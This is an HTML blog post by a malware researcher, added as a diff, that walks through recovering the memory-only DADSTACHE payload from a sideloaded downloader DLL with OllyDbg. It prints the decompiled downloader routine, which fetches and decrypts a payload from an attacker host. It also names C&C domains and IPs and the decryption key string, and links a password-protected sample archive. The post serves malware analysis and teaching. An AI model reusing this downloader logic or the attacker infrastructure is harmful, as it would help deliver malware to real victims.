@@ -1,0 +1,361 @@
+<!DOCTYPE html>
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en-us">
+<head>
+   <meta http-equiv="content-type" content="text/html; charset=utf-8" />
+   <title>Knowledge Fragment: Casting Sandbox Necromancy on DADSTACHE</title>
+   <meta name="author" content="Daniel Plohmann" />
+
+   <!-- CSS -->
+   <link rel="stylesheet" href="/css/syntax.css" type="text/css" />
+   <link rel="stylesheet" href="/css/screen.css" type="text/css" media="screen, projection" />
+   <link href="https://fonts.googleapis.com/css?family=Roboto+Mono&display=swap" rel="stylesheet">
+</head>
+<body>
+
+<div class="site">
+  <div class="title">
+    <a href="/">
+      <div class="heading">
+        <a href="/">
+          <img src="/assets/logo_long.svg" width=850 />
+        </a>
+      </div>
+    </a>
+  </div>
+
+  <header class="post-header">
+    <h1 class="post-title p-name" itemprop="name headline">Knowledge Fragment: Casting Sandbox Necromancy on DADSTACHE</h1>
+    <p class="post-date">
+      <time class="dt-published" datetime="2020-07-10T00:00:00+00:00" itemprop="datePublished">2020-07-10 00:00</time>
+    </p>
+  </header>
+  <hr />
+
+<div id="post">
+<p>I’m still thinking of a good way to revive this blog. 
+One idea I had is to simply write about interesting encounters I have while maintaining/extending the <a href="https://malpedia.caad.fkie.fraunhofer.de/">Malpedia</a> corpus.</p>
+
+<p>I recently had one such encounter when working on a submission by <a href="https://twitter.com/r0ny_123">Rony</a>, about which <a href="https://twitter.com/maciekkotowicz">mak</a> also <a href="https://twitter.com/malwarelabpl/status/1273646045239672835">tweeted</a>.
+Additionally, Elastic already wrote a detailed <a href="https://www.elastic.co/de/blog/advanced-techniques-used-in-malaysian-focused-apt-campaign">blog post</a> on this campaign.</p>
+
+<p>Why this blog post then? 
+Well, I think it’s worthwhile to focus a bit on the methodology side of things, especially as this concrete case allows to showcase a common workflow pattern that can be applied during analysis.
+Generally, I feel that there are great beginner tutorials for malware analysis and RE but material for intermediate skill is not as widely available.
+Perhaps I should focus on that in the future? <a href="https://twitter.com/ByteAtlas">Let me know</a>.</p>
+
+<p>For today, as a basis, there is this great <a href="https://app.any.run/tasks/425d6b1b-d68d-4e5c-996d-8b1753faf750/">ANY.RUN capture</a> for the given case, which we will dissect in this post!<br />
+I’ll also provide all relevant data, so you can use this as a hands-on exercise/walkthrough.</p>
+
+<p>In summary, we will briefly look at an attack using</p>
+<ul>
+  <li>a Word-based downloader pulling</li>
+  <li>another downloader (using <a href="https://attack.mitre.org/techniques/T1574/001/">DLL Search Order Hijacking</a>) which then fetches</li>
+  <li>a payload that is only decrypted in memory.</li>
+</ul>
+
+<p>Our objective: We want to extract that final memory-only payload.<br />
+For this we will use Sandbox Necromancy!</p>
+
+<h3 id="sandbox-necromancy">Sandbox Necromancy?</h3>
+
+<p>I’ve chosen the title “Sandbox Necromancy” to describe the following analysis workflow pattern:<br />
+<em>Given a previous (automated) dynamic analysis and corresponding recordings (sandbox run, PCAP, memory dumps, …), a malware analyst wants to recreate a specific situation that existed during this dynamic analysis in order to do additional research, e.g. access volatile data.</em></p>
+
+<p>Over the years I have encountered several variations of this pattern, typically when writing malware traffic/configuration decryptors or unpacking samples.</p>
+
+<p>Sandbox Necromancy may become necessary in cases where the <em>world changed</em> since the recordings, for example because the respective C&amp;C server has disappeared or our IP address was blocked or it is generally geofenced and we still want to continue to investigate. 
+It can also be required when there is no VM snapshot from a previous investigation available and we have to recreate a identical runtime situation from whatever data we have still available.</p>
+
+<p>In some cases it also allows us to repeat specific analysis steps decoupled from external dependencies, potentially speeding up the analysis itself.</p>
+
+<iframe src="https://giphy.com/embed/LBrxm7ARM6c0w" width="480" height="233" frameborder="0" class="giphy-embed" allowfullscreen=""></iframe>
+<p><a href="https://giphy.com/gifs/mrw-hours-professor-LBrxm7ARM6c0w">via GIPHY</a></p>
+
+<p>I’ll now explain how this applies to the concrete case.</p>
+
+<h3 id="a-wild-dadstache-appears">A wild DADSTACHE appears</h3>
+
+<p>Please spend a couple minutes reviewing the following <a href="https://app.any.run/tasks/425d6b1b-d68d-4e5c-996d-8b1753faf750/">ANY.RUN capture</a>.</p>
+
+<p>Done? Good! :)</p>
+
+<p><a href="https://danielplohmann.github.io/assets/20200710/anyrun_screenshot.png"><img src="https://danielplohmann.github.io/assets/20200710/anyrun_screenshot.png" alt="screenshot" title="ANY.RUN sandbox run" /></a></p>
+
+<p>You may have assessed that:</p>
+<ul>
+  <li>The process tree lists 3 executables (<code class="language-plaintext highlighter-rouge">WINWORD.exe -&gt; cmd.exe -&gt; LogiMailApp.exe</code>)</li>
+  <li>The network tabs list a lot of traffic from <code class="language-plaintext highlighter-rouge">WINWORD.exe</code> and <code class="language-plaintext highlighter-rouge">LogiMailApp.exe</code> but sadly it appears that everything is encrypted.</li>
+  <li>A closer look at the behavior of <code class="language-plaintext highlighter-rouge">WINWORD.exe</code> reveals:
+    <ul>
+      <li>6 network connections, pulling ~430kb of data</li>
+      <li>a few created files, among them <code class="language-plaintext highlighter-rouge">LogiMailApp.exe</code> and <code class="language-plaintext highlighter-rouge">LogiMailApp.dll</code> (adding up to 410kb, corresponding to the downloads)</li>
+    </ul>
+  </li>
+  <li>A closer look at the behavior of <code class="language-plaintext highlighter-rouge">cmd.exe</code> reveals… not much at all, apart from being used to start <code class="language-plaintext highlighter-rouge">LogiMailApp.exe</code>.</li>
+  <li>A closer look at the behavior of <code class="language-plaintext highlighter-rouge">LogiMailApp.exe</code> reveals
+    <ul>
+      <li>an initial network check-in (<code class="language-plaintext highlighter-rouge">104.248.148.156 (armybar.hopto.org)</code>), leading to a download of 140kb of data</li>
+      <li>a file <code class="language-plaintext highlighter-rouge">Encrypted[1]</code> of size 135kb potentially corresponding to that download</li>
+      <li>many more network check-ins (<code class="language-plaintext highlighter-rouge">139.59.31.188 (tomema.myddns.me)</code>) to another IP address, starting approximately one minute after the first check-in.</li>
+    </ul>
+  </li>
+</ul>
+
+<p>This allows to theorize the secondary check-ins have something to do with the <code class="language-plaintext highlighter-rouge">Encrypted[1]</code> and what happens to it once it is downloaded and in-memory.
+However, there is no way to simply obtain this decrypted in-memory code fragment, as it was not stored by sandbox.</p>
+
+<p>Because the C&amp;C server of interest (<code class="language-plaintext highlighter-rouge">104.248.148.156 (armybar.hopto.org)</code>) is dead by now, we can not simply perform a dynamic analysis / debugging session and walk through these steps as <code class="language-plaintext highlighter-rouge">Encrypted[1]</code> will never be downloaded. 
+Maybe we also do not want the threat actors to know that we are performing this analysis and want to perform no network interaction anyway.
+This is where our sandbox necromancy comes into play.</p>
+
+<p>Luckily, ANY.RUN allows us to collect all files needed to revive the execution state. 
+They are also available on VirusTotal and potentially elsewhere:</p>
+
+<p><code class="language-plaintext highlighter-rouge">LogiMailApp.exe</code> (optional)<br />
+sha256: <code class="language-plaintext highlighter-rouge">93810c5fd9a287d85c182d2ad13e7d30f99df76e55bb40e5bc7a486d259810c8</code><br />
+<code class="language-plaintext highlighter-rouge">LogiMail.dll</code> (sideloaded by <code class="language-plaintext highlighter-rouge">LogiMailApp.exe</code> - but can also be loaded directly in a debugger)<br />
+sha256: <code class="language-plaintext highlighter-rouge">11508c1727134877dea18f30df2d2c659a112e632c3fb8e16ddad722727c775a</code><br />
+<code class="language-plaintext highlighter-rouge">Encrypted</code> (our target)<br />
+sha256: <code class="language-plaintext highlighter-rouge">06a4246be400ad0347e71b3c4ecd607edda59fbf873791d3772ce001f580c1d3</code></p>
+
+<p>If you want to play along, I have packaged them <a href="https://github.com/danielplohmann/danielplohmann.github.io/tree/master/assets/20200710/samples.zip">here</a> (password: <code class="language-plaintext highlighter-rouge">infected</code>) for simplicity.<br />
+I spare you the typical warnings about malware and just assume you know what you are doing when you ended up reading so far in. :)</p>
+
+<h3 id="analysis-of-logimaildll">Analysis of LogiMail.dll</h3>
+
+<p>We will now dive a bit deeper, first obtaining an overview using static analysis and then performing the actual necromancy using a debugger.</p>
+
+<h2 id="static-analysis">Static Analysis</h2>
+
+<p>Looking at <code class="language-plaintext highlighter-rouge">LogiMail.dll</code>, we quickly identify the function <code class="language-plaintext highlighter-rouge">DllGetClassObject</code> at offset <code class="language-plaintext highlighter-rouge">0x10002250</code> as relevant because</p>
+<ul>
+  <li>it makes use of WinAPI calls such as <code class="language-plaintext highlighter-rouge">URLDownloadToFileA</code>, <code class="language-plaintext highlighter-rouge">ReadFile</code>, and <code class="language-plaintext highlighter-rouge">CryptDecrypt</code>, which fits what we are looking for and</li>
+  <li>it is also an exported function</li>
+</ul>
+
+<p>Here’s the control flow graph:</p>
+
+<p><a href="https://danielplohmann.github.io/assets/20200710/ida_screenshot.png"><img src="https://danielplohmann.github.io/assets/20200710/ida_screenshot.png" alt="screenshot" title="DllGetClassObject in IDA" /></a></p>
+
+<p>Through careful analysis we can learn the following:</p>
+<ul>
+  <li><code class="language-plaintext highlighter-rouge">"%TMP%\\~liseces1.pcs"</code>is being passed to <code class="language-plaintext highlighter-rouge">ExpandEnvironmentStringsA</code>, which replaces <code class="language-plaintext highlighter-rouge">%TEMP%</code> by the full path. In case of our ANY.RUN trace, this would be <code class="language-plaintext highlighter-rouge">C:\Users\admin\AppData\Local\Temp\~liseces1.pcs</code></li>
+  <li>a string <code class="language-plaintext highlighter-rouge">HcRVJiZhrS2e0itoEyk/kaOz5fqCiLl4tr6CI4RlO5FWMRCgDA2dXXbaKMHm9Ffv</code> is being passed to <code class="language-plaintext highlighter-rouge">CryptStringBinaryA</code> with flag <code class="language-plaintext highlighter-rouge">0x1</code> (meaning <code class="language-plaintext highlighter-rouge">CRYPT_STRING_BASE64</code>), which will then produce the corresponding binary string (<code class="language-plaintext highlighter-rouge">1dc455262661ad2d9ed22b6813293f91a3b3e5fa8288b978b6be822384653b91563110a00c0d9d5d76da28c1e6f457ef</code>) in <code class="language-plaintext highlighter-rouge">pbBinary</code></li>
+  <li><code class="language-plaintext highlighter-rouge">pbBinary</code> is then decrypted using <code class="language-plaintext highlighter-rouge">CryptDecrypt</code> (with <code class="language-plaintext highlighter-rouge">hKey</code> being previously set up in <code class="language-plaintext highlighter-rouge">sub_10002430</code> -&gt; an AES128 key derived using the SHA256 hash of string <code class="language-plaintext highlighter-rouge">7PLGdUh0jc-1GoEl</code>)</li>
+  <li>this decrypted string is then being passed to <code class="language-plaintext highlighter-rouge">UrlDownloadToFileA</code>, indicating it’s potentially a URL. As download destination, we can see the previously expanded path for <code class="language-plaintext highlighter-rouge">~liseces1.pcs</code> being used</li>
+  <li>if the download is successful, the file is read (<code class="language-plaintext highlighter-rouge">CreateFileA</code>, <code class="language-plaintext highlighter-rouge">GetFileSize</code>, <code class="language-plaintext highlighter-rouge">ReadFile</code>) and afterwards deleted (<code class="language-plaintext highlighter-rouge">DeleteFileA</code>)</li>
+  <li>Another call to <code class="language-plaintext highlighter-rouge">CryptDecrypt</code> is used on the file content now residing in memory.</li>
+  <li>The decrypted contents are being passed to <code class="language-plaintext highlighter-rouge">sub_100012f0</code> - let’s assume for now this is for readying execution of the in-memory payload.</li>
+</ul>
+
+<p>For readability, here’s also HexRays’ decompilation output:</p>
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">HRESULT</span> <span class="kr">__stdcall</span> <span class="nf">DllGetClassObject</span><span class="p">(</span><span class="k">const</span> <span class="n">IID</span> <span class="o">*</span><span class="k">const</span> <span class="n">rclsid</span><span class="p">,</span> <span class="k">const</span> <span class="n">IID</span> <span class="o">*</span><span class="k">const</span> <span class="n">riid</span><span class="p">,</span> <span class="n">LPVOID</span> <span class="o">*</span><span class="n">ppv</span><span class="p">)</span>
+<span class="p">{</span>
+  <span class="n">HANDLE</span> <span class="n">v3</span><span class="p">;</span> <span class="c1">// eax</span>
+  <span class="kt">void</span> <span class="o">*</span><span class="n">v4</span><span class="p">;</span> <span class="c1">// edi</span>
+  <span class="n">DWORD</span> <span class="n">v5</span><span class="p">;</span> <span class="c1">// esi</span>
+  <span class="kt">void</span> <span class="o">*</span><span class="n">v6</span><span class="p">;</span> <span class="c1">// ebx</span>
+  <span class="n">CHAR</span> <span class="n">Dst</span><span class="p">[</span><span class="mi">260</span><span class="p">];</span> <span class="c1">// [esp+Ch] [ebp-218h]</span>
+  <span class="n">BYTE</span> <span class="n">pbBinary</span><span class="p">[</span><span class="mi">260</span><span class="p">];</span> <span class="c1">// [esp+110h] [ebp-114h]</span>
+  <span class="n">DWORD</span> <span class="n">NumberOfBytesRead</span><span class="p">;</span> <span class="c1">// [esp+214h] [ebp-10h]</span>
+  <span class="kt">int</span> <span class="n">v11</span><span class="p">;</span> <span class="c1">// [esp+218h] [ebp-Ch]</span>
+  <span class="n">DWORD</span> <span class="n">cchString</span><span class="p">;</span> <span class="c1">// [esp+21Ch] [ebp-8h]</span>
+  <span class="n">DWORD</span> <span class="n">pcbBinary</span><span class="p">;</span> <span class="c1">// [esp+220h] [ebp-4h]</span>
+
+  <span class="n">memset</span><span class="p">(</span><span class="n">Dst</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">Dst</span><span class="p">));</span>
+  <span class="n">cchString</span> <span class="o">=</span> <span class="n">strlen</span><span class="p">(</span><span class="n">pszString</span><span class="p">);</span>
+  <span class="n">memset</span><span class="p">(</span><span class="n">pbBinary</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">pbBinary</span><span class="p">));</span>
+  <span class="n">pcbBinary</span> <span class="o">=</span> <span class="mi">260</span><span class="p">;</span>
+  <span class="n">v11</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+  <span class="n">ExpandEnvironmentStringsA</span><span class="p">(</span><span class="s">"%TMP%</span><span class="se">\\</span><span class="s">~liseces1.pcs"</span><span class="p">,</span> <span class="n">Dst</span><span class="p">,</span> <span class="mh">0x104u</span><span class="p">);</span>
+  <span class="k">if</span> <span class="p">(</span> <span class="n">CryptStringToBinaryA</span><span class="p">(</span><span class="n">pszString</span><span class="p">,</span> <span class="n">cchString</span><span class="p">,</span> <span class="mi">1u</span><span class="p">,</span> <span class="n">pbBinary</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">pcbBinary</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span> <span class="o">&amp;&amp;</span> 
+       <span class="n">sub_10002430</span><span class="p">()</span> <span class="p">)</span>
+  <span class="p">{</span>
+    <span class="k">if</span> <span class="p">(</span> <span class="n">CryptDecrypt</span><span class="p">(</span><span class="n">hKey</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">pbBinary</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">pcbBinary</span><span class="p">)</span> <span class="p">)</span>
+    <span class="p">{</span>
+      <span class="n">sub_10002530</span><span class="p">();</span>
+      <span class="n">pbBinary</span><span class="p">[</span><span class="n">pcbBinary</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+      <span class="n">sub_10001FB0</span><span class="p">(</span><span class="n">pszString</span><span class="p">,</span> <span class="s">"%s"</span><span class="p">,</span> <span class="p">(</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">pbBinary</span><span class="p">);</span>
+      <span class="k">while</span> <span class="p">(</span> <span class="mi">1</span> <span class="p">)</span>
+      <span class="p">{</span>
+        <span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="n">URLDownloadToFileA</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">pszString</span><span class="p">,</span> <span class="n">Dst</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span> <span class="p">)</span>
+        <span class="p">{</span>
+          <span class="n">v3</span> <span class="o">=</span> <span class="n">CreateFileA</span><span class="p">(</span><span class="n">Dst</span><span class="p">,</span> <span class="mh">0x80000000</span><span class="p">,</span> <span class="mi">1u</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">3u</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+          <span class="n">v4</span> <span class="o">=</span> <span class="n">v3</span><span class="p">;</span>
+          <span class="k">if</span> <span class="p">(</span> <span class="n">v3</span> <span class="o">!=</span> <span class="p">(</span><span class="n">HANDLE</span><span class="p">)</span><span class="o">-</span><span class="mi">1</span> <span class="p">)</span>
+          <span class="p">{</span>
+            <span class="n">v5</span> <span class="o">=</span> <span class="n">GetFileSize</span><span class="p">(</span><span class="n">v3</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+            <span class="n">cchString</span> <span class="o">=</span> <span class="n">v5</span><span class="p">;</span>
+            <span class="n">v6</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="n">v5</span><span class="p">);</span>
+            <span class="n">ReadFile</span><span class="p">(</span><span class="n">v4</span><span class="p">,</span> <span class="n">v6</span><span class="p">,</span> <span class="n">v5</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">NumberOfBytesRead</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+            <span class="n">CloseHandle</span><span class="p">(</span><span class="n">v4</span><span class="p">);</span>
+            <span class="n">DeleteFileA</span><span class="p">(</span><span class="n">Dst</span><span class="p">);</span>
+            <span class="k">if</span> <span class="p">(</span> <span class="n">sub_10002430</span><span class="p">()</span> <span class="p">)</span>
+            <span class="p">{</span>
+              <span class="k">if</span> <span class="p">(</span> <span class="n">CryptDecrypt</span><span class="p">(</span><span class="n">hKey</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="p">(</span><span class="n">BYTE</span> <span class="o">*</span><span class="p">)</span><span class="n">v6</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">cchString</span><span class="p">)</span> <span class="p">)</span>
+                <span class="n">sub_100012F0</span><span class="p">(</span><span class="o">&amp;</span><span class="n">v11</span><span class="p">);</span>
+            <span class="p">}</span>
+            <span class="n">sub_10002530</span><span class="p">();</span>
+          <span class="p">}</span>
+        <span class="p">}</span>
+        <span class="n">Sleep</span><span class="p">(</span><span class="mh">0x3E8u</span><span class="p">);</span>
+      <span class="p">}</span>
+    <span class="p">}</span>
+    <span class="n">sub_10002530</span><span class="p">();</span>
+  <span class="p">}</span>
+  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>Alright, armed with this knowledge, we can now plan our ritual.</p>
+
+<h2 id="dynamic-analysis">Dynamic Analysis</h2>
+
+<p>Given that we already have the involved files, we can simply craft the desired execution flow in the debugger.
+This will let us ignore the cryptography details and work with a <code class="language-plaintext highlighter-rouge">~liseces1.pcs</code> - which already magically appeared without the need of network access.
+We will only need <code class="language-plaintext highlighter-rouge">LogiMail.dll</code> and <code class="language-plaintext highlighter-rouge">Encrypted</code> for this.</p>
+
+<p>Our plan is to simply start up <code class="language-plaintext highlighter-rouge">LogiMail.dll</code> and step through <code class="language-plaintext highlighter-rouge">DllGetClassObject</code>.
+As all WinAPI calls except <code class="language-plaintext highlighter-rouge">URLDownloadToFileA</code> have no dependency, we should be able to work our way through them from the beginning of the function.
+We will then just skip the download and modify the arguments of <code class="language-plaintext highlighter-rouge">CreateFileA</code> to point wherever we put the “downloaded” file.
+Once it is read into memory and decrypted, we simply dump the buffer to obtain our initially stated goal: extraction of a payload, previously not found in the sandbox run.</p>
+
+<p>My tool of choice here is a Win7 VM and OllyDbg.</p>
+
+<p>The following screenshot shows the initial view after loading the DLL:</p>
+
+<p><a href="https://danielplohmann.github.io/assets/20200710/olly_dll_main.png"><img src="https://danielplohmann.github.io/assets/20200710/olly_dll_main.png" alt="screenshot" title="Starting in Olly." /></a></p>
+
+<p>We see that Windows decided that <code class="language-plaintext highlighter-rouge">0x1c0000</code> was a good place to load <code class="language-plaintext highlighter-rouge">LogiMail.dll</code> and simply adjust all offsets to that.
+The function OllyDbg sets us initially to is <code class="language-plaintext highlighter-rouge">DllEntryPoint</code>. 
+If we would simply redirect our execution now to our target function <code class="language-plaintext highlighter-rouge">DllGetClassObject</code>, we might encounter problems, as execution has not been set up properly yet (stack cookie and heap initialization, …).
+So it does not hurt to simply step over until the end of this function (return at <code class="language-plaintext highlighter-rouge">0x1c2eee</code>).<br />
+This is now also an exceptionally great time to create a first VM snapshot. :)</p>
+
+<p>We are now ready to jump (<code class="language-plaintext highlighter-rouge">CTRL+G</code>) to <code class="language-plaintext highlighter-rouge">DllGetClassObject</code> at <code class="language-plaintext highlighter-rouge">0x1c2250</code>.
+In order to continue here, we simply set the first instruction as “New Origin” via the context menu</p>
+
+<p><a href="https://danielplohmann.github.io/assets/20200710/olly_dll_start_of_function.png"><img src="https://danielplohmann.github.io/assets/20200710/olly_dll_start_of_function.png" alt="screenshot" title="Moving to the target function." /></a></p>
+
+<p>We are greeted with the strings and WinAPI calls identified during static analysis.
+As I said, we do not want to be bothered with the cryptography and download, so we can simply set a breakpoint on the call to <code class="language-plaintext highlighter-rouge">URLDownloadToFileA</code> (<code class="language-plaintext highlighter-rouge">0x1c2362</code>) and run:</p>
+
+<p><a href="https://danielplohmann.github.io/assets/20200710/olly_dll_urldownloadtofile.png"><img src="https://danielplohmann.github.io/assets/20200710/olly_dll_urldownloadtofile.png" alt="screenshot" title="Before UrlDownloadToFileA." /></a></p>
+
+<p>Nice! As a side-effect we now also get the download URL that we already knew from the ANY.RUN trace (<code class="language-plaintext highlighter-rouge">https://armybar.hopto.org/Encrypted</code>).
+Note that the sandbox so far gave us only the server (<code class="language-plaintext highlighter-rouge">armybar.hopto.org</code>) but not exact URL for this - while rightfully assuming so, we now additionally confirmed that the file <code class="language-plaintext highlighter-rouge">Encrypted</code> found in the Temporary Internet Files is the actual <code class="language-plaintext highlighter-rouge">~liseces1.pcs</code> to be used next for decryption.</p>
+
+<p>As strategized before, we will now <em>not</em> execute this API call but instead simply jump over it and proceed to the next instruction <code class="language-plaintext highlighter-rouge">test eax, eax</code>.
+As we can see, it is expected that <code class="language-plaintext highlighter-rouge">URLDownloadToFileA</code> would return <code class="language-plaintext highlighter-rouge">0x0</code> in order to continue into the part of the function that loads the file.
+We can simply clear the EAX register by manipulating its content.
+For convenience, we also don’t need to place our <code class="language-plaintext highlighter-rouge">Encrypted</code> file at the location for shown in the screenshot (<code class="language-plaintext highlighter-rouge">C:\Users\redacted\AppData\Local\Temp\~liseces1.pcs</code>) but we can simply put it in any other location of our choice and change the path in the dump.
+The results of these actions (proceed execuction, modify file location) are shown in this screenshot:</p>
+
+<p><a href="https://danielplohmann.github.io/assets/20200710/olly_dll_urldownloadtofile_passed.png"><img src="https://danielplohmann.github.io/assets/20200710/olly_dll_urldownloadtofile_passed.png" alt="screenshot" title="After not executing UrlDownloadToFileA." /></a></p>
+
+<p>One thing is important to note here: As we had already pushed arguments for <code class="language-plaintext highlighter-rouge">URLDownloadToFileA</code> onto the stack but did not execute the API call, this may have deranged the stack (by 5 DWORDs to be exact).
+This can be an issue when manipulating execution context in bigger debugging sessions. 
+We avoid this, we could have set our breakpoint to <code class="language-plaintext highlighter-rouge">0x1c2350</code> (before execution of the argument pushes) instead, or manually fixed <code class="language-plaintext highlighter-rouge">ESP</code>.
+For this situation, this does not matter too much as we will not leave the context of this function and all relevant following pointer are relative to <code class="language-plaintext highlighter-rouge">EBP</code>.</p>
+
+<p>Continuing our execution, we next need to know where the file contents will be stored in memory for decryption.
+For this, we can execute until after the <code class="language-plaintext highlighter-rouge">ReadFile</code> API call, because we can reconstruct the location from the <code class="language-plaintext highlighter-rouge">EBX</code> register:</p>
+
+<p><a href="https://danielplohmann.github.io/assets/20200710/olly_dll_readfile.png"><img src="https://danielplohmann.github.io/assets/20200710/olly_dll_readfile.png" alt="screenshot" title="After executing RadFile." /></a></p>
+
+<p>You can follow the mouse cursor and see EBX pointing to <code class="language-plaintext highlighter-rouge">0x2e6740</code>, with the contents shown in the dump tab in the lower left corner.
+Our final steps are now continuing execution until after the <code class="language-plaintext highlighter-rouge">CryptDecrypt</code> and extracting the decrypted payload:</p>
+
+<p><a href="https://danielplohmann.github.io/assets/20200710/olly_dll_decrypted.png"><img src="https://danielplohmann.github.io/assets/20200710/olly_dll_decrypted.png" alt="screenshot" title="The decrypted payload in memory." /></a></p>
+
+<p>Excellent, there is the iconic tell-tale sign of our successful payload extraction: an MZ header!
+Using the context menu, we can dump the full section with the target payload.
+The only step left is ripping the executable from the section, which I usually do with my favorite hex editor: 010Editor.<br />
+The resulting unpacked file has a size of 138.752 bytes and is the DADSTACHE payload we were longing for!</p>
+
+<p>As this final payload is not available on VT as of now, I have also added it to the <a href="https://github.com/danielplohmann/danielplohmann.github.io/tree/master/assets/20200710/samples.zip">package</a> mentioned earlier.<br />
+<code class="language-plaintext highlighter-rouge">unpacked</code> (the result of the efforts described in here)<br />
+sha256: <code class="language-plaintext highlighter-rouge">f922913ed85e79d4a5eb804f23bde0888de86dc6f5521fde7ed607db212f1256</code></p>
+
+<h3 id="summary">Summary</h3>
+
+<p>I hope this outline of “Sandbox Necromancy” and the walkthrough are helpful to some of you.
+It’s certainly a technique that is easily transferred to other situations and generally very useful.</p>
+
+<p>If you want me to do more write-ups like this one, <a href="https://twitter.com/ByteAtlas">let me know</a>.
+I typically struggle a bit when estimating if such aspects of analysis are too trivial or worthwhile the effort of documenting. :)</p>
+
+<p>For further reading, a similar extraction walkthrough for an earlier DADSTACHE sample was written by <a href="https://medium.com/insomniacs/dad-theres-a-rat-in-here-e3729b65bf7a">Asuna Amawaka</a>.</p>
+
+
+</div>
+
+<div id="related">
+  <h2>Related Posts</h2>
+  <ul class="posts">
+    
+      <li><span>2024-03-08 10:00</span> &raquo; <a href="/blog/2024/03/08/malpediaflossed.html">MalpediaFLOSSed</a></li>
+    
+      <li><span>2023-08-02 10:20</span> &raquo; <a href="/blog/2023/08/02/mcrit_blocks.html">Upgraded MCRIT Feature: IDA Plugin</a></li>
+    
+      <li><span>2023-08-01 07:00</span> &raquo; <a href="/blog/2023/08/01/kf-hardening-win10.html">Knowledge Fragment: Hardening Win10 x64 on VirtualBox for Malware Analysis</a></li>
+    
+  </ul>
+</div>
+
+  <div class="footer">
+    <div class="contact">
+      <p>
+        Daniel Plohmann
+        <br />
+        Malware Researcher @ Fraunhofer FKIE.<br />
+        <span class="icon  icon--buymeacoffee">
+          <img src="/assets/buymeacoffee.svg" alt="buymeacoffee" height=16 />
+        </span>
+        Buy me a 
+        <a href="https://www.buymeacoffee.com/pnxpnx" target=”_blank”>coffee</a>
+      </p>
+    </div>
+    <div class="contact">
+      <p>
+        <a href="http://keybase.io/pnx/"  target=”_blank”>
+          <span class="icon  icon--keybase">
+            <img src="/assets/keybase.svg" alt="keybase" width=16 />
+          </span>
+          <span class="username">pnx</span>
+        </a><br />
+        <a href="http://twitter.com/push_pnx/" target=”_blank”>
+          <span class="icon  icon--twitter">
+            <img src="/assets/twitter.svg" alt="twitter" width=16 />
+          </span>
+          <span class="username">push_pnx</span>
+        </a><br />
+        <a href="https://github.com/danielplohmann" target=”_blank”>
+          <span class="icon  icon--github">
+            <img src="/assets/github.svg" alt="github" width=16 />
+          </span>
+          <span class="username">danielplohmann</span>
+        </a>
+      </p>
+    </div>
+    <div class="rss">
+      <a href="/feed.xml" target=”_blank”>
+        <img src="/assets/feed.svg" alt="RSS Feed" width=32 />
+      </a>
+    </div>
+  </div>
+</div>
+
+<!-- Google Analytics -->
+<script type="text/javascript">
+var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
+document.write(unescape("%3Cscript src='" + gaJsHost + "google-analytics.com/ga.js' type='text/javascript'%3E%3C/script%3E"));
+</script>
+<script type="text/javascript">
+var pageTracker = _gat._getTracker("UA-161396252-1");
+pageTracker._trackPageview();
+</script>
+<!-- Google Analytics end -->
+
+</body>
+</html>
